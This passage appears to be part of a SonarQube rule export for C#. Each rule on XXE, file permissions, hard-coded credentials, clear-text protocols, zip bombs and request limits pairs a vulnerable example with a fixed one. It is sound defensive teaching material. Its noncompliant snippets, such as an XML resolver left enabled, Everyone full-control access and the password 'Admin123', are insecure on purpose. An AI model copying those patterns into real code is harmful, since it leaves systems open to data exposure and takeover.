}\n}\n</pre>\n<h2>See</h2>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A09_2021-Security_Logging_and_Monitoring_Failures/\">Top 10 2021 Category A9 - Security Logging and\n  Monitoring Failures</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure\">Top 10 2017 Category A3 - Sensitive Data\n  Exposure</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A10_2017-Insufficient_Logging%2526Monitoring\">Top 10 2017 Category A10 -\n  Insufficient Logging &amp; Monitoring</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/117\">CWE-117 - Improper Output Neutralization for Logs</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/532\">CWE-532 - Information Exposure Through Log Files</a> </li>\n</ul>",
        "severity": "CRITICAL"
      },
      "csharpsquid:S2755": {
        "name": "XML parsers should not be vulnerable to XXE attacks",
        "htmlDesc": "<p>This vulnerability allows the usage of external entities in XML.</p>\n<h2>Why is this an issue?</h2>\n<p>External Entity Processing allows for XML parsing with the involvement of external entities. However, when this functionality is enabled without\nproper precautions, it can lead to a vulnerability known as XML External Entity (XXE) attack.</p>\n<h3>What is the potential impact?</h3>\n<h4>Exposing sensitive data</h4>\n<p>One significant danger of XXE vulnerabilities is the potential for sensitive data exposure. By crafting malicious XML payloads, attackers can\nreference external entities that contain sensitive information, such as system files, database credentials, or configuration files. When these\nentities are processed during XML parsing, the attacker can extract the contents and gain unauthorized access to sensitive data. This poses a severe\nthreat to the confidentiality of critical information.</p>\n<h4>Exhausting system resources</h4>\n<p>Another consequence of XXE vulnerabilities is the potential for denial-of-service attacks. By exploiting the ability to include external entities,\nattackers can construct XML payloads that cause resource exhaustion. This can overwhelm the system’s memory, CPU, or other critical resources, leading\nto system unresponsiveness or crashes. A successful DoS attack can disrupt the availability of services and negatively impact the user experience.</p>\n<h4>Forging requests</h4>\n<p>XXE vulnerabilities can also enable Server-Side Request Forgery (SSRF) attacks. By leveraging the ability to include external entities, an attacker\ncan make the vulnerable application send arbitrary requests to other internal or external systems. This can result in unintended actions, such as\nretrieving data from internal resources, scanning internal networks, or attacking other systems. SSRF attacks can lead to severe consequences,\nincluding unauthorized data access, system compromise, or even further exploitation within the network infrastructure.</p>\n<h2>How to fix it in .NET</h2>\n<h3>Code examples</h3>\n<p>The following code contains examples of XML parsers that have external entity processing enabled. As a result, the parsers are vulnerable to XXE\nattacks if an attacker can control the XML file that is processed.</p>\n<h4>Noncompliant code example</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\nusing System.Xml;\n\npublic static void decode()\n{\n    XmlDocument parser = new XmlDocument();\n    parser.XmlResolver = new XmlUrlResolver(); // Noncompliant\n    parser.LoadXml(\"xxe.xml\");\n}\n</pre>\n<h4>Compliant solution</h4>\n<p><code>XmlDocument</code> is safe by default since .NET Framework 4.5.2. For older versions, set <code>XmlResolver</code> explicitly to\n<code>null</code>.</p>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\nusing System.Xml;\n\npublic static void decode()\n{\n    XmlDocument parser = new XmlDocument();\n    parser.XmlResolver = null;\n    parser.LoadXml(\"xxe.xml\");\n}\n</pre>\n<h3>How does this work?</h3>\n<h4>Disable external entities</h4>\n<p>The most effective approach to prevent XXE vulnerabilities is to disable external entity processing entirely, unless it is explicitly required for\nspecific use cases. By default, XML parsers should be configured to reject the processing of external entities. This can be achieved by setting the\nappropriate properties or options in your XML parser library or framework.</p>\n<p>If external entity processing is necessary for certain scenarios, adopt a whitelisting approach to restrict the entities that can be resolved\nduring XML parsing. Create a list of trusted external entities and disallow all others. This approach ensures that only known and safe entities are\nprocessed.<br> You should rely on features provided by your XML parser to restrict the external entities.</p>\n<h2>Resources</h2>\n<h3>Standards</h3>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A05_2021-Security_Misconfiguration/\">Top 10 2021 Category A5 - Security Misconfiguration</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A4_2017-XML_External_Entities_(XXE)\">Top 10 2017 Category A4 - XML External\n  Entities (XXE)</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/611\">CWE-611 - Information Exposure Through XML External Entity Reference</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/827\">CWE-827 - Improper Control of Document Type Definition</a> </li>\n</ul>",
        "severity": "BLOCKER"
      },
      "csharpsquid:S2612": {
        "name": "Setting loose file permissions is security-sensitive",
        "htmlDesc": "<p>In Unix, \"others\" class refers to all users except the owner of the file and the members of the group assigned to this file.</p>\n<p>In Windows, \"Everyone\" group is similar and includes all members of the Authenticated Users group as well as the built-in Guest account, and\nseveral other built-in security accounts.</p>\n<p>Granting permissions to these groups can lead to unintended access to files.</p>\n<h2>Ask Yourself Whether</h2>\n<ul>\n  <li> The application is designed to be run on a multi-user environment. </li>\n  <li> Corresponding files and directories may contain confidential information. </li>\n</ul>\n<p>There is a risk if you answered yes to any of those questions.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<p>The most restrictive possible permissions should be assigned to files and directories.</p>\n<h2>Sensitive Code Example</h2>\n<p>.Net Framework:</p>\n<pre>\nvar unsafeAccessRule = new FileSystemAccessRule(\"Everyone\", FileSystemRights.FullControl, AccessControlType.Allow);\n\nvar fileSecurity = File.GetAccessControl(\"path\");\nfileSecurity.AddAccessRule(unsafeAccessRule); // Sensitive\nfileSecurity.SetAccessRule(unsafeAccessRule); // Sensitive\nFile.SetAccessControl(\"fileName\", fileSecurity);\n</pre>\n<p>.Net / .Net Core</p>\n<pre>\nvar fileInfo = new FileInfo(\"path\");\nvar fileSecurity = fileInfo.GetAccessControl();\n\nfileSecurity.AddAccessRule(new FileSystemAccessRule(\"Everyone\", FileSystemRights.Write, AccessControlType.Allow)); // Sensitive\nfileInfo.SetAccessControl(fileSecurity);\n</pre>\n<p>.Net / .Net Core using Mono.Posix.NETStandard</p>\n<pre>\nvar fileSystemEntry = UnixFileSystemInfo.GetFileSystemEntry(\"path\");\nfileSystemEntry.FileAccessPermissions = FileAccessPermissions.OtherReadWriteExecute; // Sensitive\n</pre>\n<h2>Compliant Solution</h2>\n<p>.Net Framework</p>\n<pre>\nvar safeAccessRule = new FileSystemAccessRule(\"Everyone\", FileSystemRights.FullControl, AccessControlType.Deny);\n\nvar fileSecurity = File.GetAccessControl(\"path\");\nfileSecurity.AddAccessRule(safeAccessRule);\nFile.SetAccessControl(\"path\", fileSecurity);\n</pre>\n<p>.Net / .Net Core</p>\n<pre>\nvar safeAccessRule = new FileSystemAccessRule(\"Everyone\", FileSystemRights.FullControl, AccessControlType.Deny);\n\nvar fileInfo = new FileInfo(\"path\");\nvar fileSecurity = fileInfo.GetAccessControl();\nfileSecurity.SetAccessRule(safeAccessRule);\nfileInfo.SetAccessControl(fileSecurity);\n</pre>\n<p>.Net / .Net Core using Mono.Posix.NETStandard</p>\n<pre>\nvar fs = UnixFileSystemInfo.GetFileSystemEntry(\"path\");\nfs.FileAccessPermissions = FileAccessPermissions.UserExecute;\n</pre>\n<h2>See</h2>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A01_2021-Broken_Access_Control/\">Top 10 2021 Category A1 - Broken Access Control</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A04_2021-Insecure_Design/\">Top 10 2021 Category A4 - Insecure Design</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A5_2017-Broken_Access_Control\">Top 10 2017 Category A5 - Broken Access Control</a>\n  </li>\n  <li> <a\n  href=\"https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/09-Test_File_Permission\">OWASP File Permission</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/732\">CWE-732 - Incorrect Permission Assignment for Critical Resource</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/266\">CWE-266 - Incorrect Privilege Assignment</a> </li>\n</ul>",
        "severity": "MAJOR"
      },
      "csharpsquid:S3884": {
        "name": "\"CoSetProxyBlanket\" and \"CoInitializeSecurity\" should not be used",
        "htmlDesc": "<p>This rule is deprecated, and will eventually be removed.</p>\n<h2>Why is this an issue?</h2>\n<p><code>CoSetProxyBlanket</code> and <code>CoInitializeSecurity</code> both work to set the permissions context in which the process invoked\nimmediately after is executed. Calling them from within that process is useless because it’s too late at that point; the permissions context has\nalready been set.</p>\n<p>Specifically, these methods are meant to be called from non-managed code such as a C++ wrapper that then invokes the managed, i.e. C# or VB.NET,\ncode.</p>\n<h3>Noncompliant code example</h3>\n<pre>\n[DllImport(\"ole32.dll\")]\nstatic extern int CoSetProxyBlanket([MarshalAs(UnmanagedType.IUnknown)]object pProxy, uint dwAuthnSvc, uint dwAuthzSvc,\n\t[MarshalAs(UnmanagedType.LPWStr)] string pServerPrincName, uint dwAuthnLevel, uint dwImpLevel, IntPtr pAuthInfo,\n\tuint dwCapabilities);\n\npublic enum RpcAuthnLevel\n{\n\tDefault = 0,\n\tNone = 1,\n\tConnect = 2,\n\tCall = 3,\n\tPkt = 4,\n\tPktIntegrity = 5,\n\tPktPrivacy = 6\n}\n\npublic enum RpcImpLevel\n{\n\tDefault = 0,\n\tAnonymous = 1,\n\tIdentify = 2,\n\tImpersonate = 3,\n\tDelegate = 4\n}\n\npublic enum EoAuthnCap\n{\n\tNone = 0x00,\n\tMutualAuth = 0x01,\n\tStaticCloaking = 0x20,\n\tDynamicCloaking = 0x40,\n\tAnyAuthority = 0x80,\n\tMakeFullSIC = 0x100,\n\tDefault = 0x800,\n\tSecureRefs = 0x02,\n\tAccessControl = 0x04,\n\tAppID = 0x08,\n\tDynamic = 0x10,\n\tRequireFullSIC = 0x200,\n\tAutoImpersonate = 0x400,\n\tNoCustomMarshal = 0x2000,\n\tDisableAAA = 0x1000\n}\n\n[DllImport(\"ole32.dll\")]\npublic static extern int CoInitializeSecurity(IntPtr pVoid, int cAuthSvc, IntPtr asAuthSvc, IntPtr pReserved1,\n\tRpcAuthnLevel level, RpcImpLevel impers, IntPtr pAuthList, EoAuthnCap dwCapabilities, IntPtr pReserved3);\n\nstatic void Main(string[] args)\n{\n\tvar hres1 = CoSetProxyBlanket(null, 0, 0, null, 0, 0, IntPtr.Zero, 0); // Noncompliant\n\n\tvar hres2 = CoInitializeSecurity(IntPtr.Zero, -1, IntPtr.Zero, IntPtr.Zero, RpcAuthnLevel.None,\n\t\tRpcImpLevel.Impersonate, IntPtr.Zero, EoAuthnCap.None, IntPtr.Zero); // Noncompliant\n}\n</pre>\n<h2>Resources</h2>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A01_2021-Broken_Access_Control/\">Top 10 2021 Category A1 - Broken Access Control</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration\">Top 10 2017 Category A6 - Security\n  Misconfiguration</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/648\">CWE-648 - Incorrect Use of Privileged APIs</a> </li>\n</ul>",
        "severity": "BLOCKER"
      },
      "csharpsquid:S1313": {
        "name": "Using hardcoded IP addresses is security-sensitive",
        "htmlDesc": "<p>Hardcoding IP addresses is security-sensitive. It has led in the past to the following vulnerabilities:</p>\n<ul>\n  <li> <a href=\"http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2006-5901\">CVE-2006-5901</a> </li>\n  <li> <a href=\"http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2005-3725\">CVE-2005-3725</a> </li>\n</ul>\n<p>Today’s services have an ever-changing architecture due to their scaling and redundancy needs. It is a mistake to think that a service will always\nhave the same IP address. When it does change, the hardcoded IP will have to be modified too. This will have an impact on the product development,\ndelivery, and deployment:</p>\n<ul>\n  <li> The developers will have to do a rapid fix every time this happens, instead of having an operation team change a configuration file. </li>\n  <li> It misleads to use the same address in every environment (dev, sys, qa, prod). </li>\n</ul>\n<p>Last but not least it has an effect on application security. Attackers might be able to decompile the code and thereby discover a potentially\nsensitive address. They can perform a Denial of Service attack on the service, try to get access to the system, or try to spoof the IP address to\nbypass security checks. Such attacks can always be possible, but in the case of a hardcoded IP address solving the issue will take more time, which\nwill increase an attack’s impact.</p>\n<h2>Ask Yourself Whether</h2>\n<p>The disclosed IP address is sensitive, e.g.:</p>\n<ul>\n  <li> Can give information to an attacker about the network topology. </li>\n  <li> It’s a personal (assigned to an identifiable person) IP address. </li>\n</ul>\n<p>There is a risk if you answered yes to any of these questions.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<p>Don’t hard-code the IP address in the source code, instead make it configurable with environment variables, configuration files, or a similar\napproach. Alternatively, if confidentially is not required a domain name can be used since it allows to change the destination quickly without having\nto rebuild the software.</p>\n<h2>Sensitive Code Example</h2>\n<pre>\nvar ip = \"192.168.12.42\";\nvar address = IPAddress.Parse(ip);\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nvar ip = ConfigurationManager.AppSettings[\"myapplication.ip\"];\nvar address = IPAddress.Parse(ip);\n</pre>\n<h2>Exceptions</h2>\n<p>No issue is reported for the following cases because they are not considered sensitive:</p>\n<ul>\n  <li> Loopback addresses 127.0.0.0/8 in CIDR notation (from 127.0.0.0 to 127.255.255.255) </li>\n  <li> Broadcast address 255.255.255.255 </li>\n  <li> Non-routable address 0.0.0.0 </li>\n  <li> Strings of the form <code>2.5.&lt;number&gt;.&lt;number&gt;</code> as they <a href=\"http://www.oid-info.com/introduction.htm\">often match\n  Object Identifiers</a> (OID) </li>\n  <li> Addresses in the ranges 192.0.2.0/24, 198.51.100.0/24, 203.0.113.0/24, reserved for documentation purposes by <a\n  href=\"https://datatracker.ietf.org/doc/html/rfc5737\">RFC 5737</a> </li>\n  <li> Addresses in the range 2001:db8::/32, reserved for documentation purposes by <a href=\"https://datatracker.ietf.org/doc/html/rfc3849\">RFC\n  3849</a> </li>\n</ul>\n<h2>See</h2>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A01_2021-Broken_Access_Control/\">Top 10 2021 Category A1 - Broken Access Control</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure\">Top 10 2017 Category A3 - Sensitive Data\n  Exposure</a> </li>\n</ul>",
        "severity": "MAJOR"
      },
      "csharpsquid:S5042": {
        "name": "Expanding archive files without controlling resource consumption is security-sensitive",
        "htmlDesc": "<p>Successful Zip Bomb attacks occur when an application expands untrusted archive files without controlling the size of the expanded data, which can\nlead to denial of service. A Zip bomb is usually a malicious archive file of a few kilobytes of compressed data but turned into gigabytes of\nuncompressed data. To achieve this extreme <a href=\"https://en.wikipedia.org/wiki/Data_compression_ratio\">compression ratio</a>, attackers will\ncompress irrelevant data (eg: a long string of repeated bytes).</p>\n<h2>Ask Yourself Whether</h2>\n<p>Archives to expand are untrusted and:</p>\n<ul>\n  <li> There is no validation of the number of entries in the archive. </li>\n  <li> There is no validation of the total size of the uncompressed data. </li>\n  <li> There is no validation of the ratio between the compressed and uncompressed archive entry. </li>\n</ul>\n<p>There is a risk if you answered yes to any of those questions.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<ul>\n  <li> Define and control the ratio between compressed and uncompressed data, in general the data compression ratio for most of the legit archives is\n  1 to 3. </li>\n  <li> Define and control the threshold for maximum total size of the uncompressed data. </li>\n  <li> Count the number of file entries extracted from the archive and abort the extraction if their number is greater than a predefined threshold, in\n  particular it’s not recommended to recursively expand archives (an entry of an archive could be also an archive). </li>\n</ul>\n<h2>Sensitive Code Example</h2>\n<pre>\nusing var zipToOpen = new FileStream(@\"ZipBomb.zip\", FileMode.Open);\nusing var archive = new ZipArchive(zipToOpen, ZipArchiveMode.Read);\nforeach (ZipArchiveEntry entry in archive.Entries)\n{\n  entry.ExtractToFile(\"./output_onlyfortesting.txt\", true); // Sensitive\n}\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nint THRESHOLD_ENTRIES = 10000;\nint THRESHOLD_SIZE = 1000000000; // 1 GB\ndouble THRESHOLD_RATIO = 10;\nint totalSizeArchive = 0;\nint totalEntryArchive = 0;\n\nusing var zipToOpen = new FileStream(@\"ZipBomb.zip\", FileMode.Open);\nusing var archive = new ZipArchive(zipToOpen, ZipArchiveMode.Read);\nforeach (ZipArchiveEntry entry in archive.Entries)\n{\n  totalEntryArchive ++;\n\n  using (Stream st = entry.Open())\n  {\n    byte[] buffer = new byte[1024];\n    int totalSizeEntry = 0;\n    int numBytesRead = 0;\n\n    do\n    {\n      numBytesRead = st.Read(buffer, 0, 1024);\n      totalSizeEntry += numBytesRead;\n      totalSizeArchive += numBytesRead;\n      double compressionRatio = totalSizeEntry / entry.CompressedLength;\n\n      if(compressionRatio &gt; THRESHOLD_RATIO) {\n        // ratio between compressed and uncompressed data is highly suspicious, looks like a Zip Bomb Attack\n        break;\n      }\n    }\n    while (numBytesRead &gt; 0);\n  }\n\n  if(totalSizeArchive &gt; THRESHOLD_SIZE) {\n      // the uncompressed data size is too much for the application resource capacity\n      break;\n  }\n\n  if(totalEntryArchive &gt; THRESHOLD_ENTRIES) {\n      // too much entries in this archive, can lead to inodes exhaustion of the system\n      break;\n  }\n}\n</pre>\n<h2>See</h2>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A01_2021-Broken_Access_Control/\">Top 10 2021 Category A1 - Broken Access Control</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A05_2021-Security_Misconfiguration/\">Top 10 2021 Category A5 - Security Misconfiguration</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A5_2017-Broken_Access_Control\">Top 10 2017 Category A5 - Broken Access Control</a>\n  </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration\">Top 10 2017 Category A6 - Security\n  Misconfiguration</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/409\">CWE-409 - Improper Handling of Highly Compressed Data (Data Amplification)</a> </li>\n  <li> <a href=\"https://www.bamsoftware.com/hacks/zipbomb/\">bamsoftware.com</a> - A better Zip Bomb </li>\n</ul>",
        "severity": "CRITICAL"
      },
      "csharpsquid:S2068": {
        "name": "Hard-coded credentials are security-sensitive",
        "htmlDesc": "<p>Because it is easy to extract strings from an application source code or binary, credentials should not be hard-coded. This is particularly true\nfor applications that are distributed or that are open-source.</p>\n<p>In the past, it has led to the following vulnerabilities:</p>\n<ul>\n  <li> <a href=\"http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-13466\">CVE-2019-13466</a> </li>\n  <li> <a href=\"http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-15389\">CVE-2018-15389</a> </li>\n</ul>\n<p>Credentials should be stored outside of the code in a configuration file, a database, or a management service for secrets.</p>\n<p>This rule flags instances of hard-coded credentials used in database and LDAP connections. It looks for hard-coded credentials in connection\nstrings, and for variable names that match any of the patterns from the provided list.</p>\n<p>It’s recommended to customize the configuration of this rule with additional credential words such as \"oauthToken\", \"secret\", …​</p>\n<h2>Ask Yourself Whether</h2>\n<ul>\n  <li> Credentials allow access to a sensitive component like a database, a file storage, an API or a service. </li>\n  <li> Credentials are used in production environments. </li>\n  <li> Application re-distribution is required before updating the credentials. </li>\n</ul>\n<p>There is a risk if you answered yes to any of those questions.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<ul>\n  <li> Store the credentials in a configuration file that is not pushed to the code repository. </li>\n  <li> Store the credentials in a database. </li>\n  <li> Use your cloud provider’s service for managing secrets. </li>\n  <li> If a password has been disclosed through the source code: change it. </li>\n</ul>\n<h2>Sensitive Code Example</h2>\n<pre>\nstring username = \"admin\";\nstring password = \"Admin123\"; // Sensitive\nstring usernamePassword  = \"user=admin&amp;password=Admin123\"; // Sensitive\nstring url = \"scheme://user:Admin123@domain.com\"; // Sensitive\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nstring username = \"admin\";\nstring password = GetEncryptedPassword();\nstring usernamePassword = string.Format(\"user={0}&amp;password={1}\", GetEncryptedUsername(), GetEncryptedPassword());\nstring url = $\"scheme://{username}:{password}@domain.com\";\n\nstring url2 = \"http://guest:guest@domain.com\"; // Compliant\nconst string Password_Property = \"custom.password\"; // Compliant\n</pre>\n<h2>Exceptions</h2>\n<ul>\n  <li> Issue is not raised when URI username and password are the same. </li>\n  <li> Issue is not raised when searched pattern is found in variable name and value. </li>\n</ul>\n<h2>See</h2>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/\">Top 10 2021 Category A7 - Identification and\n  Authentication Failures</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A2_2017-Broken_Authentication\">Top 10 2017 Category A2 - Broken Authentication</a>\n  </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/798\">CWE-798 - Use of Hard-coded Credentials</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/259\">CWE-259 - Use of Hard-coded Password</a> </li>\n  <li> Derived from FindSecBugs rule <a href=\"https://h3xstream.github.io/find-sec-bugs/bugs.htm#HARD_CODE_PASSWORD\">Hard Coded Password</a> </li>\n</ul>",
        "severity": "BLOCKER"
      },
      "csharpsquid:S5332": {
        "name": "Using clear-text protocols is security-sensitive",
        "htmlDesc": "<p>Clear-text protocols such as <code>ftp</code>, <code>telnet</code>, or <code>http</code> lack encryption of transported data, as well as the\ncapability to build an authenticated connection. It means that an attacker able to sniff traffic from the network can read, modify, or corrupt the\ntransported content. These protocols are not secure as they expose applications to an extensive range of risks:</p>\n<ul>\n  <li> sensitive data exposure </li>\n  <li> traffic redirected to a malicious endpoint </li>\n  <li> malware-infected software update or installer </li>\n  <li> execution of client-side code </li>\n  <li> corruption of critical information </li>\n</ul>\n<p>Even in the context of isolated networks like offline environments or segmented cloud environments, the insider threat exists. Thus, attacks\ninvolving communications being sniffed or tampered with can still happen.</p>\n<p>For example, attackers could successfully compromise prior security layers by:</p>\n<ul>\n  <li> bypassing isolation mechanisms </li>\n  <li> compromising a component of the network </li>\n  <li> getting the credentials of an internal IAM account (either from a service account or an actual person) </li>\n</ul>\n<p>In such cases, encrypting communications would decrease the chances of attackers to successfully leak data or steal credentials from other network\ncomponents. By layering various security practices (segmentation and encryption, for example), the application will follow the\n<em>defense-in-depth</em> principle.</p>\n<p>Note that using the <code>http</code> protocol is being deprecated by <a\nhref=\"https://blog.mozilla.org/security/2015/04/30/deprecating-non-secure-http\">major web browsers</a>.</p>\n<p>In the past, it has led to the following vulnerabilities:</p>\n<ul>\n  <li> <a href=\"https://nvd.nist.gov/vuln/detail/CVE-2019-6169\">CVE-2019-6169</a> </li>\n  <li> <a href=\"https://nvd.nist.gov/vuln/detail/CVE-2019-12327\">CVE-2019-12327</a> </li>\n  <li> <a href=\"https://nvd.nist.gov/vuln/detail/CVE-2019-11065\">CVE-2019-11065</a> </li>\n</ul>\n<h2>Ask Yourself Whether</h2>\n<ul>\n  <li> Application data needs to be protected against falsifications or leaks when transiting over the network. </li>\n  <li> Application data transits over an untrusted network. </li>\n  <li> Compliance rules require the service to encrypt data in transit. </li>\n  <li> Your application renders web pages with a relaxed mixed content policy. </li>\n  <li> OS-level protections against clear-text traffic are deactivated. </li>\n</ul>\n<p>There is a risk if you answered yes to any of those questions.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<ul>\n  <li> Make application data transit over a secure, authenticated and encrypted protocol like TLS or SSH. Here are a few alternatives to the most\n  common clear-text protocols:\n    <ul>\n      <li> Use <code>ssh</code> as an alternative to <code>telnet</code>. </li>\n      <li> Use <code>sftp</code>, <code>scp</code>, or <code>ftps</code> instead of <code>ftp</code>. </li>\n      <li> Use <code>https</code> instead of <code>http</code>. </li>\n      <li> Use <code>SMTP</code> over <code>SSL/TLS</code> or <code>SMTP</code> with <code>STARTTLS</code> instead of clear-text SMTP. </li>\n    </ul>  </li>\n  <li> Enable encryption of cloud components communications whenever it is possible. </li>\n  <li> Configure your application to block mixed content when rendering web pages. </li>\n  <li> If available, enforce OS-level deactivation of all clear-text traffic. </li>\n</ul>\n<p>It is recommended to secure all transport channels, even on local networks, as it can take a single non-secure connection to compromise an entire\napplication or system.</p>\n<h2>Sensitive Code Example</h2>\n<pre>\nvar urlHttp = \"http://example.com\";                 // Noncompliant\nvar urlFtp = \"ftp://anonymous@example.com\";         // Noncompliant\nvar urlTelnet = \"telnet://anonymous@example.com\";   // Noncompliant\n</pre>\n<pre>\nusing var smtp = new SmtpClient(\"host\", 25); // Noncompliant, EnableSsl is not set\nusing var telnet = new MyTelnet.Client(\"host\", port); // Noncompliant, rule raises Security Hotspot on any member containing \"Telnet\"\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nvar urlHttps = \"https://example.com\";\nvar urlSftp = \"sftp://anonymous@example.com\";\nvar urlSsh = \"ssh://anonymous@example.com\";\n</pre>\n<pre>\nusing var smtp = new SmtpClient(\"host\", 25) { EnableSsl = true };\nusing var ssh = new MySsh.Client(\"host\", port);\n</pre>\n<h2>Exceptions</h2>\n<p>No issue is reported for the following cases because they are not considered sensitive:</p>\n<ul>\n  <li> Insecure protocol scheme followed by loopback addresses like 127.0.0.1 or <code>localhost</code>. </li>\n</ul>\n<h2>See</h2>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A02_2021-Cryptographic_Failures/\">Top 10 2021 Category A2 - Cryptographic Failures</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure\">Top 10 2017 Category A3 - Sensitive Data Exposure\n  </a> </li>\n  <li> OWASP - <a href=\"https://mobile-security.gitbook.io/masvs/security-requirements/0x10-v5-network_communication_requirements\">Mobile AppSec\n  Verification Standard - Network Communication Requirements</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-mobile-top-10/2016-risks/m3-insecure-communication\">Mobile Top 10 2016 Category M3 - Insecure\n  Communication</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/200\">CWE-200 - Exposure of Sensitive Information to an Unauthorized Actor</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/319\">CWE-319 - Cleartext Transmission of Sensitive Information</a> </li>\n  <li> <a href=\"https://security.googleblog.com/2016/09/moving-towards-more-secure-web.html\">Google, Moving towards more secure web</a> </li>\n  <li> <a href=\"https://blog.mozilla.org/security/2015/04/30/deprecating-non-secure-http/\">Mozilla, Deprecating non secure http</a> </li>\n  <li> <a href=\"https://docs.aws.amazon.com/elasticloadbalancing/latest/application/load-balancer-listeners.html\">AWS Documentation</a> - Listeners\n  for your Application Load Balancers </li>\n  <li> <a href=\"https://docs.aws.amazon.com/AWSCloudFormation/latest/UserGuide/aws-properties-kinesis-stream-streamencryption.html\">AWS\n  Documentation</a> - Stream Encryption </li>\n</ul>",
        "severity": "CRITICAL"
      },
      "csharpsquid:S5693": {
        "name": "Allowing requests with excessive content length is security-sensitive",
        "htmlDesc": "<p>Rejecting requests with significant content length is a good practice to control the network traffic intensity and thus resource consumption in\norder to prevent DoS attacks.</p>\n<h2>Ask Yourself Whether</h2>\n<ul>\n  <li> size limits are not defined for the different resources of the web application. </li>\n  <li> the web application is not protected by <a href=\"https://en.wikipedia.org/wiki/Rate_limiting\">rate limiting</a> features. </li>\n  <li> the web application infrastructure has limited resources. </li>\n</ul>\n<p>There is a risk if you answered yes to any of those questions.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<ul>\n  <li> For most of the features of an application, it is recommended to limit the size of requests to:\n    <ul>\n      <li> lower or equal to 8mb for file uploads. </li>\n      <li> lower or equal to 2mb for other requests. </li>\n    </ul>  </li>\n</ul>\n<p>It is recommended to customize the rule with the limit values that correspond to the web application.</p>\n<h2>Sensitive Code Example</h2>\n<pre>\nusing Microsoft.AspNetCore.Mvc;\n\npublic class MyController : Controller\n{\n    [HttpPost]\n    [DisableRequestSizeLimit] // Sensitive: No size  limit\n    [RequestSizeLimit(10485760)] // Sensitive: 10485760 B = 10240 KB = 10 MB is more than the recommended limit of 8MB\n    public IActionResult PostRequest(Model model)\n    {\n    // ...\n    }\n\n    [HttpPost]\n    [RequestFormLimits(MultipartBodyLengthLimit = 10485760)] // Sensitive: 10485760 B = 10240 KB = 10 MB is more than the recommended limit of 8MB\n    public IActionResult MultipartFormRequest(Model model)\n    {\n    // ...\n    }\n}\n</pre>\n<p>In Web.config:</p>\n<pre>\n&lt;configuration&gt;\n    &lt;system.web&gt;\n        &lt;httpRuntime maxRequestLength=\"81920\" executionTimeout=\"3600\" /&gt;\n        &lt;!-- Sensitive: maxRequestLength is expressed in KB, so 81920 KB = 80 MB  --&gt;\n    &lt;/system.web&gt;\n    &lt;system.webServer&gt;\n        &lt;security&gt;\n            &lt;requestFiltering&gt;\n                &lt;requestLimits maxAllowedContentLength=\"83886080\" /&gt;\n                &lt;!-- Sensitive: maxAllowedContentLength is expressed in bytes, so 83886080 B = 81920 KB = 80 MB  --&gt;\n            &lt;/requestFiltering&gt;\n        &lt;/security&gt;\n    &lt;/system.webServer&gt;\n&lt;/configuration&gt;\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nusing Microsoft.AspNetCore.Mvc;\n\npublic class MyController : Controller\n{\n    [HttpPost]\n    [RequestSizeLimit(8388608)] // Compliant: 8388608 B = 8192 KB = 8 MB\n    public IActionResult PostRequest(Model model)\n    {\n    // ...\n    }\n\n    